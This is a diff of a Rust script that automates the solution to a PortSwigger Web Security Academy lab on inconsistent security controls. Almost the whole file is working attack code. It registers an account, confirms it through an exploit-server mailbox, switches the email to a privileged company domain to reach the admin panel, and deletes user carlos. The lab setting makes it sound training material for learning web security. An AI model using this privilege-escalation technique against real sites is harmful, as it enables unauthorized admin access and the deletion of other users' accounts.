@@ -1,34 +1,27 @@
-/**********************************************************************************
-*
-* Author: Ahmed Elqalaawy (@elqal3awii)
-*
-* Date: 25/10/2023
+/********************************************************************************
 *
 * Lab: Inconsistent security controls
 *
-* Steps: 1. Fetch the register page
-*        2. Extract the csrf token and session cookie to register a new account
-*        3. Register a new account as attacker
-*        4. Fetch the email client
-*        5. Extract the link of account registration
-*        6. Complete the account registration by following the link
-*        7. Fetch the login page
-*        8. Extract the csrf token and session cookie to login
-*        9. Login as attacker
-*        10. Fetch attacker's profile
-*        11. Extract the csrf token needed for email update
-*        12. Update the email to attacker@dontwannacry.com
-*        13. Delete carlos from the admin panel
+* Hack Steps: 
+*      1. Fetch the register page
+*      2. Extract the csrf token and session cookie to register a new account
+*      3. Register a new account as attacker
+*      4. Fetch the email client
+*      5. Extract the link of account registration
+*      6. Complete the account registration by following the link
+*      7. Fetch the login page
+*      8. Extract the csrf token and session cookie to login
+*      9. Login as attacker
+*      10. Fetch attacker's profile
+*      11. Extract the csrf token needed for email update
+*      12. Update the email to attacker@dontwannacry.com
+*      13. Delete carlos from the admin panel
 *
-***********************************************************************************/
-#![allow(unused)]
-/***********
-* Imports
-***********/
+*********************************************************************************/
+use lazy_static::lazy_static;
 use regex::Regex;
 use reqwest::{
     blocking::{Client, ClientBuilder, Response},
-    header::HeaderMap,
     redirect::Policy,
 };
 use select::{document::Document, predicate::Attr};
@@ -39,239 +32,105 @@ use std::{
 };
 use text_colorizer::Colorize;
 
-/******************
-* Main Function
-*******************/
-fn main() {
-    // change this to your lab URL
-    let url = "https://0a9c00af03f383ae82d47ac400b300ee.web-security-academy.net";
+const LAB_URL: &str = "https://0aae00970404785c826c42ea000f000d.web-security-academy.net"; // Change this to your lab URL
+const EXPLOIT_DOMAIN: &str = "exploit-0aa800f404dc789582c3415801b800f4.exploit-server.net"; // Change this to your exploit DOMAIN
+const NEW_USERNAME: &str = "attacker"; // You can change this to what you want
+const NEW_PASSWORD: &str = "hacking"; // You can change this to what you want
 
-    // change this to your exploit domain
-    let exploit_domain = "exploit-0a80005603d28348825f793a016f0091.exploit-server.net";
-
-    // build the client that will be used for all subsequent requests
-    let client = build_client();
-
-    print!("{}", "⦗1⦘ Fetching the register page.. ".white());
-    io::stdout().flush();
-
-    // fetch the register page
-    let register_page = client
-        .get(format!("{url}/register"))
-        .send()
-        .expect(&format!(
-            "{}",
-            "[!] Failed to fetch the register page".red()
-        ));
-
-    println!("{}", "OK".green());
-    print!(
-        "{}",
-        "⦗2⦘ Extracting the csrf token and session cookie to register a new account.. ".white(),
-    );
-    io::stdout().flush();
-
-    // extract session cookie
-    let mut session = extract_session_cookie(register_page.headers())
-        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));
-
-    // extract the csrf token
-    let mut csrf =
-        extract_csrf(register_page).expect(&format!("{}", "[!] Failed to extract the csrf".red()));
-
-    // the username of the new account
-    // you can change this to what you want
-    let username = "attacker";
-
-    // the username of the new account
-    // you can change this to what you want
-    let password = "hacking";
-
-    println!("{}", "OK".green());
-    print!(
-        "{} {}.. ",
-        "⦗3⦘ Registering a new account as".white(),
-        username.yellow()
-    );
-    io::stdout().flush();
-
-    // the email addresss of the attacker
-    let attacker_email = &format!("attacker@{exploit_domain}");
-
-    // register new account
-    let register = client
-        .post(format!("{url}/register"))
-        .header("Cookie", format!("session={session}"))
-        .form(&HashMap::from([
-            ("username", username),
-            ("password", password),
-            ("csrf", &csrf),
-            ("email", &attacker_email),
-        ]))
-        .send()
-        .expect(&format!("{}", "[!] Failed to register new account".red()));
-
-    println!("{}", "OK".green());
-    print!("{}", "⦗4⦘ Fetching the email client.. ".white(),);
-    io::stdout().flush();
-
-    // fetch the email client
-    let email_client = client
-        .get(format!("https://{exploit_domain}/email"))
-        .send()
-        .expect(&format!("{}", "[!] Failed to fetch the email client".red()));
-
-    println!("{}", "OK".green());
-    print!(
-        "{}",
-        "⦗5⦘ Extracting the link of account registration.. ".white(),
-    );
-    io::stdout().flush();
-
-    // get the body of the email client
-    let body = email_client.text().unwrap();
-
-    // extract the link of account registration
-    let registration_link = capture_pattern(">(https.*)</a>", &body).expect(&format!(
-        "{}",
-        "[!] Failed to extract the link of account registration".red()
-    ));
-
-    println!("{}", "OK".green());
-    print!(
-        "{}",
-        "⦗6⦘ Completing the account registration by following the link.. ".white(),
-    );
-    io::stdout().flush();
-
-    // complete the account registration
-    client.get(registration_link).send().expect(&format!(
-        "{}",
-        "[!] Failed to complete the account registration".red()
-    ));
-
-    println!("{}", "OK".green());
-    print!("{}", "⦗7⦘ Fetching the login page.. ".white(),);
-    io::stdout().flush();
-
-    // fetch the login page
-    let login_page = client
-        .get(format!("{url}/login"))
-        .send()
-        .expect(&format!("{}", "[!] Failed to fetch the login page".red()));
-
-    println!("{}", "OK".green());
-    print!(
-        "{}",
-        "⦗8⦘ Extracting the csrf token and session cookie to login.. ".white(),
-    );
-    io::stdout().flush();
-
-    // extract session cookie
-    session = extract_session_cookie(login_page.headers())
-        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));
-
-    // extract the csrf token
-    csrf = extract_csrf(login_page).expect(&format!("{}", "[!] Failed to extract the csrf".red()));
-
-    println!("{}", "OK".green());
-    print!("{} {}.. ", "⦗9⦘ Logging in as".white(), username.yellow());
-    io::stdout().flush();
-
-    // login to the new account
-    let login = client
-        .post(format!("{url}/login"))
-        .header("Cookie", format!("session={session}"))
-        .form(&HashMap::from([
-            ("username", username),
-            ("password", password),
-            ("csrf", &csrf),
-        ]))
-        .send()
-        .expect(&format!(
-            "{}",
-            "[!] Failed to login to the new account".red()
-        ));
-
-    // extract session cookie of wiener
-    session = extract_session_cookie(login.headers())
-        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));
-
-    println!("{}", "OK".green());
-    print!(
-        "{} {}{}.. ",
-        "⦗10⦘ Fetching".white(),
-        username.yellow(),
-        "'s profile".white()
-    );
-    io::stdout().flush();
-
-    // fetch the profile page
-    let profile = client
-        .get(format!("{url}/my-account"))
-        .header("Cookie", format!("session={session}"))
-        .send()
-        .expect(&format!("{}", "[!] Failed to fetch the profile page".red()));
-
-    println!("{}", "OK".green());
-    print!(
-        "{}",
-        "⦗11⦘ Extracting the csrf token needed for email update.. ".white(),
-    );
-    io::stdout().flush();
-
-    // extract the csrf token needed for email update
-    csrf = extract_csrf(profile).expect(&format!(
-        "{}",
-        "[!] Failed to extract the csrf token needed for email update".red()
-    ));
-
-    // the new email
-    let new_email = format!("{username}@dontwannacry.com");
-
-    println!("{}", "OK".green());
-    print!(
-        "{} {}.. ",
-        "⦗12⦘ Updating the email to".white(),
-        new_email.yellow()
-    );
-    io::stdout().flush();
-
-    // update the email
-    client
-        .post(format!("{url}/my-account/change-email"))
-        .header("Cookie", format!("session={session}"))
-        .form(&HashMap::from([("email", new_email), ("csrf", csrf)]))
-        .send()
-        .expect(&format!("{}", "[!] Failed to update the email".red()));
-
-    println!("{}", "OK".green());
-    print!("{}", "⦗13⦘ Deleting carlos from the admin panel.. ".white(),);
-    io::stdout().flush();
-
-    // delete carlos
-    client
-        .get(format!("{url}/admin/delete?username=carlos"))
-        .header("Cookie", format!("session={session}"))
-        .send()
-        .expect(&format!(
-            "{}",
-            "[!] Failed to delete carlos from the admin panel".red()
-        ));
-
-    println!("{}", "OK".green());
-    println!(
-        "{} {}",
-        "🗹 The lab should be marked now as".white(),
-        "solved".green()
-    )
+lazy_static! {
+    static ref WEB_CLIENT: Client = build_web_client();
 }
 
-/*******************************************************************
-* Function used to build the client
-* Return a client that will be used in all subsequent requests
-********************************************************************/
-fn build_client() -> Client {
+fn main() {
+    print!("⦗1⦘ Fetching the register page.. ");
+    flush_terminal();
+
+    let register_page = fetch(&format!("{LAB_URL}/register"));
+
+    println!("{}", "OK".green());
+    print!("⦗2⦘ Extracting the csrf token and session cookie to register a new account.. ");
+    flush_terminal();
+
+    let mut session = get_session_cookie(&register_page);
+
+    let mut csrf_token = get_csrf_token(register_page);
+
+    println!("{}", "OK".green());
+    print!(
+        "⦗3⦘ Registering a new account as {}.. ",
+        NEW_USERNAME.yellow()
+    );
+    flush_terminal();
+
+    register_new_account(&session, &csrf_token);
+
+    println!("{}", "OK".green());
+    print!("⦗4⦘ Fetching the email client.. ",);
+    flush_terminal();
+
+    let email_client = fetch(&format!("https://{EXPLOIT_DOMAIN}/email"));
+
+    println!("{}", "OK".green());
+    print!("{}", "⦗5⦘ Extracting the link of account registration.. ",);
+    flush_terminal();
+
+    let body = email_client.text().unwrap();
+    let registration_link = capture_pattern_from_text(">(https.*)</a>", &body);
+
+    println!("{}", "OK".green());
+    print!("⦗6⦘ Completing the account registration by following the link.. ");
+    flush_terminal();
+
+    fetch(&registration_link);
+
+    println!("{}", "OK".green());
+    print!("⦗7⦘ Fetching the login page.. ",);
+    flush_terminal();
+
+    let login_page = fetch(&format!("{LAB_URL}/login"));
+
+    println!("{}", "OK".green());
+    print!("⦗8⦘ Extracting the csrf token and session cookie to login.. ");
+    flush_terminal();
+
+    session = get_session_cookie(&login_page);
+    csrf_token = get_csrf_token(login_page);
+
+    println!("{}", "OK".green());
+    print!("{} {}.. ", "⦗9⦘ Logging in as", NEW_USERNAME.yellow());
+    flush_terminal();
+
+    let login = login_to_the_new_account(&session, &csrf_token);
+
+    println!("{}", "OK".green());
+    print!("⦗10⦘ Fetching {} profile.. ", NEW_USERNAME.yellow(),);
+    flush_terminal();
+
+    session = get_session_cookie(&login);
+    let profile = fetch_with_session(&format!("{LAB_URL}/my-account"), &session);
+
+    println!("{}", "OK".green());
+    print!("⦗11⦘ Extracting the csrf token needed for email update.. ");
+    flush_terminal();
+
+    println!("{}", "OK".green());
+    print!("⦗12⦘ Updating the email to {}.. ", "dontwannacry".yellow());
+    flush_terminal();
+
+    csrf_token = get_csrf_token(profile);
+    update_email(&session, &csrf_token);
+
+    println!("{}", "OK".green());
+    print!("⦗13⦘ Deleting carlos from the admin panel.. ",);
+    flush_terminal();
+
+    fetch_with_session(&format!("{LAB_URL}/admin/delete?username=carlos"), &session);
+
+    println!("{}", "OK".green());
+    println!("🗹 The lab should be marked now as {}", "solved".green())
+}
+
+fn build_web_client() -> Client {
     ClientBuilder::new()
         .redirect(Policy::none())
         .connect_timeout(Duration::from_secs(5))
@@ -279,40 +138,88 @@ fn build_client() -> Client {
         .unwrap()
 }
 
-/********************************************
-* Function to capture a pattern form a text
-*********************************************/
-fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
-    let pattern = Regex::new(pattern).unwrap();
-    if let Some(text) = pattern.captures(text) {
-        Some(text.get(1).unwrap().as_str().to_string())
-    } else {
-        None
-    }
+fn fetch(path: &str) -> Response {
+    WEB_CLIENT
+        .get(path)
+        .send()
+        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
 }
 
-/*************************************************
-* Function to extract csrf from the response body
-**************************************************/
-fn extract_csrf(res: Response) -> Option<String> {
-    if let Some(csrf) = Document::from(res.text().unwrap().as_str())
+fn register_new_account(session: &str, csrf_token: &str) -> Response {
+    let attacker_email = &format!("attacker@{EXPLOIT_DOMAIN}");
+
+    WEB_CLIENT
+        .post(format!("{LAB_URL}/register"))
+        .header("Cookie", format!("session={session}"))
+        .form(&HashMap::from([
+            ("username", NEW_USERNAME),
+            ("password", NEW_PASSWORD),
+            ("csrf", &csrf_token),
+            ("email", &attacker_email),
+        ]))
+        .send()
+        .expect(&format!("{}", "⦗!⦘ Failed to register new account".red()))
+}
+
+fn login_to_the_new_account(session: &str, csrf_token: &str) -> Response {
+    WEB_CLIENT
+        .post(format!("{LAB_URL}/login"))
+        .header("Cookie", format!("session={session}"))
+        .form(&HashMap::from([
+            ("username", NEW_USERNAME),
+            ("password", NEW_PASSWORD),
+            ("csrf", &csrf_token),
+        ]))
+        .send()
+        .expect(&format!("⦗!⦘ Failed to login as {}", NEW_USERNAME.red()))
+}
+
+fn fetch_with_session(path: &str, session: &str) -> Response {
+    WEB_CLIENT
+        .get(path)
+        .header("Cookie", format!("session={session}"))
+        .send()
+        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
+}
+
+fn update_email(session: &str, csrf_token: &str) -> Response {
+    let new_email = format!("{NEW_USERNAME}@dontwannacry.com");
+    WEB_CLIENT
+        .post(format!("{LAB_URL}/my-account/change-email"))
+        .header("Cookie", format!("session={session}"))
+        .form(&HashMap::from([
+            ("csrf", csrf_token),
+            ("email", &new_email),
+        ]))
+        .send()
+        .expect(&format!("{}", "⦗!⦘ Failed to update the email".red()))
+}
+
+fn get_csrf_token(response: Response) -> String {
+    let document = Document::from(response.text().unwrap().as_str());
+    document
         .find(Attr("name", "csrf"))
         .find_map(|f| f.attr("value"))
-    {
-        Some(csrf.to_string())
-    } else {
-        None
-    }
+        .expect(&format!("{}", "⦗!⦘ Failed to get the csrf".red()))
+        .to_string()
 }
 
-/**********************************************************
-* Function to extract session field from the cookie header
-***********************************************************/
-fn extract_session_cookie(headers: &HeaderMap) -> Option<String> {
-    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
-    if let Some(session) = capture_pattern("session=(.*); Secure", cookie) {
-        Some(session.as_str().to_string())
-    } else {
-        None
-    }
+fn get_session_cookie(response: &Response) -> String {
+    let headers = response.headers();
+    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
+    capture_pattern_from_text("session=(.*); Secure", cookie_header)
+}
+
+fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
+    let regex = Regex::new(pattern).unwrap();
+    let captures = regex.captures(text).expect(&format!(
+        "⦗!⦘ Failed to capture the pattern: {}",
+        pattern.red()
+    ));
+    captures.get(1).unwrap().as_str().to_string()
+}
+
+#[inline(always)]
+fn flush_terminal() {
+    io::stdout().flush().unwrap();
 }
